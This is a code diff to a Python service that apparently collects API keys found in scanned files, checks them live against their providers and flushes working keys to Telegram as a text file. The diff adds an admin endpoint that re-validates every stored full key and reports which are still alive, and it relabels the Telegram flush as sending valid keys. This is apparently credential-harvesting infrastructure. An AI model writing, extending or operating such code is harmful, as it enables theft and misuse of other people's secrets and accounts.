@@ -88,7 +88,9 @@ async def _flush_loop():
         try:
             n = await flush_unverified_buffer()
             if n:
-                log.info("flushed %d unverified keys to Telegram as text file", n)
+                log.info("flushed %d valid keys to Telegram as text file", n)
+            else:
+                log.debug("flush: buffer empty, nothing to send")
         except Exception as e:
             log.error("flush loop err: %s", e)
 
@@ -348,6 +350,34 @@ async def health():
         },
         "db_mb":        db_mb,
         "files_scanned": db.get_stats().get("files_scanned", 0),
+    }
+
+
+@app.post("/admin/revalidate")
+async def admin_revalidate(authorization: str | None = Header(default=None)):
+    """
+    Re-validate ALL keys currently marked is_valid=1 right now (don't wait for the 12h loop).
+    Updates is_valid=0 + last_validated_at for keys that no longer pass.
+    Use after bulk imports, or to instantly clean up stale valid flags.
+    """
+    _check_admin(authorization)
+    from validators import validate as _validate
+    # max_age_hours=0 → cutoff=now → everything with NULL or any past time qualifies
+    rows = db.get_valid_keys_to_revalidate(max_age_hours=0, limit=2000)
+    results: dict[str, list[str]] = {"dead": [], "alive": []}
+    for row in rows:
+        ok = await _validate(row["provider"], row["key_full"])
+        db.update_key_validity(row["key_hash"], ok)
+        results["dead" if not ok else "alive"].append(
+            f"{row['provider']}:{row['key_full'][:16]}…"
+        )
+    log.info("admin revalidate: %d dead, %d alive out of %d checked",
+             len(results["dead"]), len(results["alive"]), len(rows))
+    return {
+        "checked":    len(rows),
+        "now_dead":   len(results["dead"]),
+        "still_alive": len(results["alive"]),
+        "dead_keys":  results["dead"],
     }
 
 
